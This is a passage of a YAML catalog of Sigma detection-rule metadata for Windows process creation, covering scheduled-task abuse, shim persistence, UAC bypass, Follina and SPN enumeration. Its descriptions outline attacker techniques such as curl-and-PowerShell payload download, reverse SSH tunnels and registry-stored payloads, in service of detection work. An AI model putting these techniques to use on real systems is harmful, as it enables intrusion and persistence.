  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_creation_temp_folder.yml
  name: Suspicious Scheduled Task Creation Involving Temp Folder
  description: Detects the creation of scheduled tasks that involves a temporary folder
    and runs only once
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3
  false_positives:
  - Administrative activity
  - Software installation
  notes: ''
- detection_id: 1d174d38-8fda-4081-a9b6-56d9763c0cd8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_curl_and_powershell_combo.yml
  name: Scheduled Task Creation with Curl and PowerShell Execution Combo
  description: 'Detects the creation of a scheduled task using schtasks.exe, potentially
    in combination with curl for downloading payloads and PowerShell for executing
    them.

    This facilitates executing malicious payloads or connecting with C&C server persistently
    without dropping the malware sample on the host.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1105
  - T1218
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.defense-evasion
  - attack.t1218
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://tria.ge/241015-l98snsyeje/behavioral2
  false_positives:
  - Legitimate use of schtasks for administrative purposes.
  - Automation scripts combining curl and PowerShell in controlled environments.
  notes: ''
- detection_id: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_delete.yml
  name: Delete Important Scheduled Task
  description: Detects when adversaries stop services or processes by deleting their
    respective scheduled tasks in order to conduct data destructive activities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 220457c1-1c9f-4c2e-afe6-9598926222c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_delete_all.yml
  name: Delete All Scheduled Tasks
  description: Detects the usage of schtasks with the delete flag and the asterisk
    symbol to delete all tasks from the schedule of the local computer, including
    tasks scheduled by other users.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-delete
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9ac94dc8-9042-493c-ba45-3b5e7c86b980
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_disable.yml
  name: Disable Important Scheduled Task
  description: Detects when adversaries stop services or processes by disabling their
    respective scheduled tasks in order to conduct data destructive activities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task
  - https://twitter.com/MichalKoczwara/status/1553634816016498688
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 81325ce1-be01-4250-944f-b4789644556f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_env_folder.yml
  name: Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via
    Schtasks.EXE
  description: Detects Schtask creations that point to a suspicious folder or an environment
    variable often used by malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/
  - https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04
  - https://blog.talosintelligence.com/gophish-powerrat-dcrat/
  false_positives:
  - Benign scheduled tasks creations or executions that happen often during software
    installations
  - Software that uses the AppData folder and scheduled tasks to update the software
    in the AppData folders
  notes: ''
- detection_id: 8a8379b8-780b-4dbf-b1e9-31c8d112fefb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_folder_combos.yml
  name: Schtasks From Suspicious Folders
  description: Detects scheduled task creations that have suspicious action command
    and folder combinations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lazarus-dream-job-chemical
  false_positives:
  - Unknown
  notes: ''
- detection_id: ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_guid_task_name.yml
  name: Suspicious Scheduled Task Name As GUID
  description: Detects creation of a scheduled task with a GUID like name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Legitimate software naming their tasks as GUIDs
  notes: ''
- detection_id: 970823b7-273b-460a-8afc-3a6811998529
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_one_time_only_midnight_task.yml
  name: Uncommon One Time Only Scheduled Task At 00:00
  description: Detects scheduled task creation events that include suspicious actions,
    and is run once at 00:00
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.005
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte
  false_positives:
  - Software installation
  notes: ''
- detection_id: 2daa93a0-a5fb-41c5-8cd8-3c11294bfd1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_openssh_tunnelling.yml
  name: Potential SSH Tunnel Persistence Install Using A Scheduled Task
  description: Detects the creation of new scheduled tasks via commandline, using
    Schtasks.exe. This rule detects tasks creating that call OpenSSH, which may indicate
    the creation of reverse SSH tunnel to the attacker's server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  - attack.command-and-control
  time_window: ''
  references:
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://www.kroll.com/en/insights/publications/cyber/cactus-ransomware-prickly-new-variant-evades-detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: f548a603-c9f2-4c89-b511-b089f7e94549
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_persistence_windows_telemetry.yml
  name: Potential Persistence Via Microsoft Compatibility Appraiser
  description: 'Detects manual execution of the "Microsoft Compatibility Appraiser"
    task via schtasks.

    In order to trigger persistence stored in the "\AppCompatFlags\TelemetryController"
    registry key.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b66474aa-bd92-4333-a16c-298155b120df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_powershell_persistence.yml
  name: Potential Persistence Via Powershell Search Order Hijacking - Task
  description: Detects suspicious powershell execution via a schedule task where the
    command ends with an suspicious flags to hide the powershell instance instead
    of executeing scripts or commands. This could be a sign of persistence via PowerShell
    "Get-Variable" technique as seen being used in Colibri Loader
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001
  time_window: ''
  references:
  - https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 86588b36-c6d3-465f-9cee-8f9093e07798
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml
  name: Scheduled Task Executing Payload from Registry
  description: Detects the creation of a schtasks that potentially executes a payload
    stored in the Windows Registry using PowerShell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader_encoded.yml
  name: Scheduled Task Executing Encoded Payload from Registry
  description: Detects the creation of a schtask that potentially executes a base64
    encoded payload stored in the Windows Registry using PowerShell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 24c8392b-aa3c-46b7-a545-43f71657fe98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml
  name: Suspicious Schtasks Schedule Types
  description: Detects scheduled task creations or modification on a suspicious schedule
    type
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  false_positives:
  - Legitimate processes that run at logon. Filter according to your environment
  notes: ''
- detection_id: 7a02e22e-b885-4404-b38b-1ddc7e65258a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type_system.yml
  name: Suspicious Schtasks Schedule Type With High Privileges
  description: Detects scheduled task creations or modification to be run with high
    privileges on a suspicious schedule type
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create
  false_positives:
  - Some installers were seen using this method of creation unfortunately. Filter
    them in your environment
  notes: ''
- detection_id: dd2a821e-3b07-4d3b-a9ac-929fe4c6ca0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_schedule_via_masqueraded_xml_file.yml
  name: Suspicious Scheduled Task Creation via Masqueraded XML File
  description: Detects the creation of a scheduled task using the "-XML" flag with
    a file without the '.xml' extension. This behavior could be indicative of potential
    defense evasion attempt during persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1036.005
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.defense-evasion
  - attack.persistence
  - attack.t1036.005
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/taskschd/daily-trigger-example--xml-
  - https://github.com/elastic/protections-artifacts/blob/084067123d3328a823b1c3fdde305b694275c794/behavior/rules/persistence_suspicious_scheduled_task_creation_via_masqueraded_xml_file.toml
  false_positives:
  - Unknown
  notes: ''
- detection_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
  name: Suspicious Command Patterns In Scheduled Task Creation
  description: Detects scheduled task creation using "schtasks" that contain potentially
    suspicious or uncommon commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053.005
  time_window: ''
  references:
  - https://app.any.run/tasks/512c1352-6380-4436-b27d-bb62f0c020d6/
  - https://twitter.com/RedDrip7/status/1506480588827467785
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf
  false_positives:
  - Software installers that run from temporary folders and also install scheduled
    tasks are expected to generate some false positives
  notes: ''
- detection_id: 89ca78fd-b37c-4310-b3d3-81a023f83936
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_system.yml
  name: Schtasks Creation Or Modification With SYSTEM Privileges
  description: Detects the creation or update of a scheduled task to run with "NT
    AUTHORITY\SYSTEM" privileges
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f8573c9-22b4-40e3-89c1-72bc2b8d49ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_schtasks_system_process.yml
  name: Scheduled Task Creation Masquerading as System Processes
  description: Detects the creation of scheduled tasks that involve system processes,
    which may indicate malicious actors masquerading as or abusing these processes
    to execute payloads or maintain persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1036.004
  - T1036.005
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.defense-evasion
  - attack.t1036.004
  - attack.t1036.005
  time_window: ''
  references:
  - https://tria.ge/241015-l98snsyeje/behavioral2
  false_positives:
  - Legitimate system administration tasks scheduling trusted system processes.
  notes: ''
- detection_id: f6d1dd2f-b8ce-40ca-bc23-062efb686b34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_scrcons_susp_child_process.yml
  name: Script Event Consumer Spawning Process
  description: Detects a suspicious child process of Script Event Consumer (scrcons.exe).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://redcanary.com/blog/child-processes/
  - https://docs.paloaltonetworks.com/cortex/cortex-xdr/cortex-xdr-analytics-alert-reference/cortex-xdr-analytics-alert-reference/scrcons-exe-rare-child-process.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 517490a7-115a-48c6-8862-1a481504d5a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sdbinst_shim_persistence.yml
  name: Potential Shim Database Persistence via Sdbinst.EXE
  description: 'Detects installation of a new shim using sdbinst.exe.

    Adversaries may establish persistence and/or elevate privileges by executing malicious
    content triggered by application shims

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.011
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/fin7-shim-databases-persistence
  false_positives:
  - Unknown
  notes: ''
- detection_id: 18ee686c-38a3-4f65-9f44-48a077141f42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sdbinst_susp_extension.yml
  name: Uncommon Extension Shim Database Installation Via Sdbinst.EXE
  description: 'Detects installation of a potentially suspicious new shim with an
    uncommon extension using sdbinst.exe.

    Adversaries may establish persistence and/or elevate privileges by executing malicious
    content triggered by application shims

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.011
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.011
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
  - https://github.com/nasbench/Misc-Research/blob/8ee690e43a379cbce8c9d61107442c36bd9be3d3/Other/Undocumented-Flags-Sdbinst.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: da2738f2-fadb-4394-afa7-0a0674885afa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sdclt_child_process.yml
  name: Sdclt Child Processes
  description: A General detection for sdclt spawning new processes. This could be
    an indicator of sdclt being used for bypass UAC techniques.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/6
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: f3d39c45-de1a-4486-a687-ab126124f744
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml
  name: Sdiagnhost Calling Suspicious Child Process
  description: Detects sdiagnhost.exe calling a suspicious child process (e.g. used
    in exploits for Follina / CVE-2022-30190)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/nao_sec/status/1530196847679401984
  - https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
  - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/
  - https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/
  - https://app.any.run/tasks/c4117d9a-f463-461a-b90f-4cd258746798/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_secedit_execution.yml
  name: Potential Suspicious Activity Using SeCEdit
  description: Detects potential suspicious behaviour using secedit.exe. Such as exporting
    or modifying the security policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Discovery
  - Persistence
  techniques:
  - T1082
  - T1505.005
  - T1546.007
  - T1546.008
  - T1547.001
  - T1547.002
  - T1547.010
  - T1547.014
  - T1556.002
  - T1557
  - T1562
  - T1562.002
  - T1564.002
  - T1574.007
  tags:
  - attack.collection
  - attack.discovery
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.privilege-escalation
  - attack.t1562.002
  - attack.t1547.001
  - attack.t1505.005
  - attack.t1556.002
  - attack.t1562
  - attack.t1574.007
  - attack.t1564.002
  - attack.t1546.008
  - attack.t1546.007
  - attack.t1547.014
  - attack.t1547.010
  - attack.t1547.002
  - attack.t1557
  - attack.t1082
  time_window: ''
  references:
  - https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit
  false_positives:
  - Legitimate administrative use
  notes: ''
- detection_id: ba3874b9-0fae-465f-836c-eb5d071a1789
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_security_susp_node_js_execution.yml
  name: NodeJS Execution of JavaScript File
  description: 'Detects execution of JavaScript or JSC files using NodeJs binary node.exe,
    that could be potentially suspicious.

    Node.js is a popular open-source JavaScript runtime that runs code outside browsers
    and is widely used for both frontend and backend development.

    Adversaries have been observed abusing Node.js to disguise malware as legitimate
    processes, evade security defenses, and maintain persistence within target systems.

    Because Node.js is commonly used, this rule may generate false positives in some
    environments. However, if such activity is unusual in your environment, it is
    highly suspicious and warrants immediate investigation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.007
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2025/04/15/threat-actors-misuse-node-js-to-deliver-malware-and-other-malicious-payloads/
  false_positives:
  - Legitimate use of node.exe to execute JavaScript or JSC files on your environment
  notes: ''
- detection_id: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml
  name: Suspicious Serv-U Process Pattern
  description: Detects a suspicious process pattern which could be a sign of an exploited
    Serv-U service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  - cve.2021-35211
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/
  false_positives:
  - Legitimate uses in which users or programs use the SSH service of Serv-U for remote
    command execution
  notes: ''
- detection_id: 835e75bf-4bfd-47a4-b8a6-b766cac8bcb7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_setres_uncommon_child_process.yml
  name: Uncommon Child Process Of Setres.EXE
  description: 'Detects uncommon child process of Setres.EXE.

    Setres.EXE is a Windows server only process and tool that can be used to set the
    screen resolution.

    It can potentially be abused in order to launch any arbitrary file with a name
    containing the word "choice" from the current execution path.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Setres/
  - https://twitter.com/0gtweet/status/1583356502340870144
  - https://strontic.github.io/xcyclopedia/library/setres.exe-0E30E4C09637D7A128A37B59A3BC4D09.html
  - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1eeed653-dbc8-4187-ad0c-eeebb20e6599
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_setspn_spn_enumeration.yml
  name: Potential SPN Enumeration Via Setspn.EXE
  description: Detects service principal name (SPN) enumeration used for Kerberoasting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
